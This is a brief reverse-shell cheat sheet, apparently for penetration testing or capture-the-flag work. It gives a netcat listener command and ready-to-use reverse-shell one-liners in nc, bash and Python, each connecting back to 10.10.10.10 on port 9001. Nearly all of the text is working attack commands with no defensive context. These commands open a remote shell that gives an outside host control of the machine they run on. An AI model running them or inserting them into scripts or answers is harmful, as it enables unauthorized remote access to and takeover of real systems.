### Listen

```bash
nc -nvlp 9001
```

### Get shell

#### nc

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

#### bash

```bash
bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"
```

#### python

```bash
export RHOST="10.10.10.10";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

#### python3

```bash
export RHOST="10.10.10.10";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
